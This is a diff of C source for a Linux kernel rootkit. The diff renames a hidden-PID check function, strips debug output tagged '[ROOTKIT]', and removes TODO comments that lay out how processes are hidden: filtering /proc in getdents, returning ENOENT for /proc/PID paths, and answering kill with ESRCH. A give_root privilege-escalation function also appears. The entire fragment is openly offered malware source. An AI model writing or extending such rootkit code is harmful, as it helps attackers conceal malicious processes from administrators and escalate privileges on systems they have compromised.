@@ -38,18 +38,13 @@ void show_all_processes(void)
     }
 }
 
-bool is_process_hidden(const pid_t i32_pid)
+bool is_pid_hidden(const pid_t i32_pid)
 {
     const hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
     const pid_t i32_real_pid         = get_effective_pid(i32_pid); // Effective PID to check
 
     if (i32_real_pid == -1) {
         return false;
-    }
-
-    pr_info("[ROOTKIT] * Hidden PIDs:\n");
-    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
-        pr_info("[ROOTKIT]   - %d\n", p_hidden_pid->i32_pid);
     }
 
     // Check if the given PID is in the hidden list
@@ -92,13 +87,6 @@ long give_root(const pid_t i32_pid, const int i32_sig)
 
 long hide_process(const pid_t i32_pid, const int i32_sig)
 {
-    // TODO
-    // Create a global list of hidden PIDs
-    // Add the given PID to the list (if given PID is 0, add the current PID)
-    // When a call to getdent is made, check if the dir is /proc (hide the PID), or
-    // or if the dir is /proc/PID or a child (return ENOENT for open, getdents, etc.)
-    // When a call to kill is made, check if the PID is in the list (return ESRCH if it is)
-
     hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
     const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show
 
